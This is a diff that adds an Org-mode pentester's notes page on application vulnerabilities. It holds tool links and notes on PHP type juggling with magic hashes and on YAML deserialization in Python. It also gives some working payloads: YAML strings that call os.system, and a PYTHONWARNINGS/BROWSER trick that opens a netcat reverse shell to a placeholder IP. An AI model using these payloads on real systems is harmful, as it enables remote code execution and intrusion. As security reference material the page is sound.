@@ -1,0 +1,138 @@
+#+TITLE: Application-related vulnerabilities
+#+INCLUDE: ../../../templates/rtfsg.org
+
+
+* Source code analysis
+*** General tools
+
+- [[https://www.sonarqube.org/][Sonarqube]] (static analyis)
+
+*** Language specific
+***** C/C++
+
+- [[https://cppcheck.sourceforge.io/][Cppcheck]] (static analysis)
+- [[https://www.intel.com/content/www/us/en/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html][Pin]] (instrumentation)
+- [[https://valgrind.org/][Valgrind]] (instrumentation)
+
+***** PHP
+
+- [[http://rips-scanner.sourceforge.net/][RIPS scanner]] (static analysis)
+* .NET
+*** Decompilers
+
+- [[https://www.jetbrains.com/decompiler/][dotPeek]]: decompiles any .NET assembly into equivalent C# or IL code.
+* PHP
+:PROPERTIES:
+:CUSTOM_ID: php
+:END:
+*** Filters
+*** Type juggling
+
+- [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling][PayloadAllTheThings - Juggling type and magic hashes]].
+
+  First it is important to identify which version of PHP is running. Versions
+  5, 7 and 8 behave differently when it comes to loose comparaisons (operators
+  ~==~ and ~!=~).
+
+  #+begin_src php
+php > var_dump("0e123456789012345678901234567890" == md5(240610708));
+bool(true)
+  #+end_src
+
+  | *Hash function* | *Value*          |                                                   *Hashed Value* |
+  |-----------------+------------------+------------------------------------------------------------------|
+  | /md5/           | *240610708*      |                                 0e462097431906509019562988736854 |
+  | /sha-224/       | *10885164793773* |         0e281250946775200129471613219196999537878926740638594636 |
+  | /sha-256/       | *34250003024812* | 0e46289032038065916139621039085883773413820991920706299695051332 |
+
+#+begin_src shell
+$ rgi '[^=][!=]=[^=]' --glob '*.php'
+#+end_src
+
+*** Common functions
+***** assert()
+***** preg_match()
+***** preg_replace()
+*** Deserialization
+*** Execution sinks
+* Python
+:PROPERTIES:
+:CUSTOM_ID: python
+:END:
+*** Deserialization
+***** pickle
+***** yaml
+
+General resources:
+
+- [[https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#python][OWASP Cheatsheet on deserialization with Python]]
+- [[https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf][YAML Deserialization Attack in Python]] (pdf).
+
+  Look for these strings to identify serialized data:
+
+  | *data*      | *base64*     |
+  |-------------+--------------|
+  | *yaml:*     | eWFtbDog     |
+  | *!!python/* | ISFweXRob24v |
+
+  Payloads:
+
+  #+begin_src python
+import yaml
+
+sleep =  b'!!python/object/apply:time.sleep [10]'
+system = b'!!python/object/apply:os.system ["id"]'
+
+yaml.load(payload, Loader=yaml.Loader)
+  #+end_src
+
+*** Environment Variables
+
+When running a Python script, the interpret will check if the =PYTHONWARNINGS=
+environment variable is set (equivalent to the =-W= flag). This variable is of
+the form =action:message:category:module:line= and the "category" field can be
+used to import a Python module. There is a particular module, =antigravity=
+which offers code execution as soon as it is imported. This comes from an Easter
+egg where the import will launch a web browser and open the [[https://xkcd.com/353/][XKCD comic about
+Python]].
+
+The web browser used comes from the [[https://github.com/python/cpython/blob/f5a9c34f38886c5cf9c2f8d860eee3473447e030/Lib/webbrowser.py][webbrowser.py]] module. As can be seen around
+line 552, the module will execute any command passed within the environment
+variable =BROWSER=.
+
+By setting the variables as follows, we can get arbitrary shell command
+execution:
+
+#+begin_src bash
+PYTHONWARNINGS="all:0:antigravity.x:0:0"
+BROWSER="/bin/sh -c '/bin/nc -e /bin/sh <ip> <port>'"
+python3 <script.py>
+#+end_src
+
+Another option is to use =/bin/bash= as =BROWSER= and set the environment
+variable =BASH_ENV= which will be evaluate when Bash runs.
+
+Sources:
+
+- [[https://www.elttam.com/blog/env/][Elttam's blog]]
+- [[https://0xn3va.gitbook.io/cheat-sheets/web-application/command-injection#python][0xn3va]]
+
+* Node.js
+*** SQL Injection with Express and MySQL
+
+Authentication bypass can be achieved due to type confusion, as explained [[https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4][here]].
+
+* Misc
+*** ImageMagick
+
+- [[https://www.synacktiv.com/publications/playing-with-imagetragick-like-its-2016.html][Playing with ImageTragick like it's 2016]]: revisited attacks on ImageMagick
+  by [[https://www.synacktiv.com/index.html][Synacktiv]].
+
+*** JSON
+:PROPERTIES:
+:CUSTOM_ID: json
+:END:
+
+- [[https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities][An Exploration of JSON Interoperability Vulnerabilities]]: Detailed
+  explanations about the common pitfalls that can arise when passing JSON data
+  between applications (from [[https://labs.bishopfox.com][Bishop Fox Labs]]).
